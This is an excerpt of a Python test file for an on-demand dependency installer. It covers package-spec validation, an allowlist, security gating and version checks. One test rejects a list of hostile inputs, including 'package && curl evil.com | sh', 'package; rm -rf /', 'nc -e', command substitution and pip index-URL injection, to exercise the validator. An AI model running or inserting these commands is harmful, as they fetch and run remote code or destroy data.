"""Tests for tools.lazy_deps â€” the supply-chain-resilient on-demand installer.
...
call is mocked â€” we never actually shell out during unit tests.
"""
...
class TestSpecSafety:
    ...
    @pytest.mark.parametrize("spec", [
        # URL-shaped â†’ rejected (no remote origin override allowed)
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        # File path â†’ rejected
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Shell metacharacters â†’ rejected
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        # Pip flag injection â†’ rejected
        "--index-url=http://evil/",
        "-r requirements.txt",
        # Whitespace control chars â†’ rejected
        "package\nshell-injection",
        "package\rmore",
        # Empty / overly long â†’ rejected
        "",
        "x" * 500,
    ])
...
class TestAllowlist:
    ...
    def test_lazy_deps_keys_use_namespace_dot_name(self):
        # Sanity check on the data shape â€” every key should be at least
    ...
    def test_every_lazy_dep_spec_passes_safety(self):
        # Defence in depth â€” even though specs are author-controlled,
...
class TestSecurityGating:
    ...
    def test_disabled_via_env_var(self, monkeypatch):
        monkeypatch.setenv("ZED_DISABLE_LAZY_INSTALLS", "1")
    ...
    def test_default_allows(self, monkeypatch):
        monkeypatch.delenv("ZED_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {}},
        )
...
# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B â€” "stale pin" detection)
#
...
class TestIsSatisfiedVersionAware:
    ...
    def test_exact_pin_mismatch_returns_false(self, monkeypatch):
        # Installed 2.0.0, spec requires 2.0.1 â†’ False (needs upgrade).
    ...
    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint â€” presence alone counts as satisfied.
    ...
    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 â€” the [encryption] block must not
...
# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A â€” zed update wiring)
# ---------------------------------------------------------------------------
...
class TestRefreshActiveFeatures:
    ...
    def test_install_failure_recorded_not_raised(self, monkeypatch):
        # A failed refresh must NOT raise out of zed update.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
    ...
    def test_lazy_installs_disabled_marked_skipped(self, monkeypatch):
        # security.allow_lazy_installs=false â†’ don't error, mark skipped
        # so zed update can render "respecting your config" message.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
    ...
    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        ...
        # a.ok: already satisfied â†’ "current"
        # b.fail: missing + install fails â†’ "failed:"
        def fake_satisfied(spec):
